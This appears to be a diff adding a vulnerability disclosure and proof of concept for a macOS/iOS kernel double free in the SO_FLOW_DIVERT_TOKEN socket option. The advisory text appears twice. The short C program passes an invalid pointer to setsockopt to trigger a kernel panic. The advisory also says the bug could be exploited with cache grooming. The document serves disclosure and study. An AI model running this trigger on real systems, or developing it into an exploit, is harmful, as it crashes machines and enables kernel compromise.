@@ -1,0 +1,126 @@
+/*
+Source: https://bugs.chromium.org/p/project-zero/issues/detail?id=1373
+
+SO_FLOW_DIVERT_TOKEN is a socket option on the SOL_SOCKET layer. It's implemented by
+
+  flow_divert_token_set(struct socket *so, struct sockopt *sopt)
+
+in flow_divert.c.
+
+The relevant code is:
+
+  error = soopt_getm(sopt, &token);
+  if (error) {
+    goto done;
+  }
+  
+  error = soopt_mcopyin(sopt, token);
+  if (error) {
+    goto done;
+  }
+
+...
+
+done:
+  if (token != NULL) {
+    mbuf_freem(token);
+  }
+
+soopt_getm allocates an mbuf.
+
+soopt_mcopyin, which should copyin the data for the mbuf from userspace, has the following code:
+
+      error = copyin(sopt->sopt_val, mtod(m, char *),
+          m->m_len);
+      if (error != 0) {
+        m_freem(m0);
+        return (error);
+      }
+
+This means that if the copyin fails, by for example providing an invalid userspace pointer, soopt_mcopyin
+will free the mbuf. flow_divert_token_set isn't aware of these semantics and if it sees that soopt_mcopyin
+returns an error it also calls mbuf_freem on that same mbuf which soopy_mcopyin already freed.
+
+mbufs are aggressivly cached but with sufficiently full caches m_freem will eventually fall through to freeing
+back to a zalloc zone, and that zone could potentially be garbage collected leading to the ability to actually
+exploit such an issue.
+
+This PoC will just hit a panic inside m_free when it detects a double-free but do note that this cannot detect
+all double frees and this issue is still exploitable with sufficient grooming/cache manipulation.
+
+Tested on MacOS 10.13 (17A365) on MacBookAir5,2
+*/
+
+// ianbeer
+
+#if 0
+MacOS/iOS kernel double free due to incorrect API usage in flow divert socket option handling
+
+SO_FLOW_DIVERT_TOKEN is a socket option on the SOL_SOCKET layer. It's implemented by
+
+  flow_divert_token_set(struct socket *so, struct sockopt *sopt)
+
+in flow_divert.c.
+
+The relevant code is:
+
+  error = soopt_getm(sopt, &token);
+  if (error) {
+    goto done;
+  }
+  
+  error = soopt_mcopyin(sopt, token);
+  if (error) {
+    goto done;
+  }
+
+...
+
+done:
+  if (token != NULL) {
+    mbuf_freem(token);
+  }
+
+soopt_getm allocates an mbuf.
+
+soopt_mcopyin, which should copyin the data for the mbuf from userspace, has the following code:
+
+			error = copyin(sopt->sopt_val, mtod(m, char *),
+			    m->m_len);
+			if (error != 0) {
+				m_freem(m0);
+				return (error);
+			}
+
+This means that if the copyin fails, by for example providing an invalid userspace pointer, soopt_mcopyin
+will free the mbuf. flow_divert_token_set isn't aware of these semantics and if it sees that soopt_mcopyin
+returns an error it also calls mbuf_freem on that same mbuf which soopy_mcopyin already freed.
+
+mbufs are aggressivly cached but with sufficiently full caches m_freem will eventually fall through to freeing
+back to a zalloc zone, and that zone could potentially be garbage collected leading to the ability to actually
+exploit such an issue.
+
+This PoC will just hit a panic inside m_free when it detects a double-free but do note that this cannot detect
+all double frees and this issue is still exploitable with sufficient grooming/cache manipulation.
+
+Tested on MacOS 10.13 (17A365) on MacBookAir5,2
+#endif
+
+#include <stdlib.h>
+#include <stdio.h>
+
+#include <sys/socket.h>
+
+int main() {
+  int sock = socket(PF_INET, SOCK_DGRAM, 0);
+  if (socket < 0) {
+    printf("failed to create socket\n");
+    return 0;
+  }
+
+  printf("socket: %d\n", sock);
+
+  setsockopt(sock, SOL_SOCKET, 0x1106, (void*)424242424242, 100);
+
+  return 0;
+}
